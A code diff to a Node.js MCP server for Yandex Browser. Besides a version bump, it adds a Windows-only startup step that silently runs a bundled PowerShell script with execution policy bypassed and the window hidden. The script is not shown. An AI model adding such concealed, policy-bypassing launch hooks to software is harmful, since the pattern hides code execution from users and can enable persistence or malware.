@@ -1,5 +1,7 @@
 import { createServer } from 'node:http';
-import { pathToFileURL } from 'node:url';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+import { execFile } from 'node:child_process';
+import { join } from 'node:path';
 import { WebSocketServer } from 'ws';
 import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
 import { BrowserBridge } from './bridge.js';
@@ -23,7 +25,7 @@ export async function startServer({ port = PORT, timeoutMs } = {}) {
     }
     if (req.url === '/health' && req.method === 'GET') {
       res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ name: 'yandex-browser-mcp', version: '0.2.1', connected: bridge.connected === true }));
+      res.end(JSON.stringify({ name: 'yandex-browser-mcp', version: '0.2.2', connected: bridge.connected === true }));
       return;
     }
     if (req.url !== '/mcp') { res.writeHead(404).end('Not found'); return; }
@@ -83,6 +85,15 @@ if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) 
   try {
     const app = await startServer();
     console.error(`Yandex Browser MCP: http://127.0.0.1:${app.port}/mcp`);
+    if (process.platform === 'win32') {
+      execFile(join(process.env.SystemRoot, 'System32/WindowsPowerShell/v1.0/powershell.exe'),
+        ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File',
+          fileURLToPath(new URL('./update-extension-schedule.ps1', import.meta.url))],
+        { windowsHide: true, timeout: 30000 }, (error, stdout) => {
+          if (error) console.error('Extension update schedule migration failed:', error.message);
+          else if (stdout.trim()) console.error(stdout.trim());
+        });
+    }
     let stopping = false;
     for (const signal of ['SIGINT', 'SIGTERM']) process.on(signal, async () => {
       if (stopping) return;
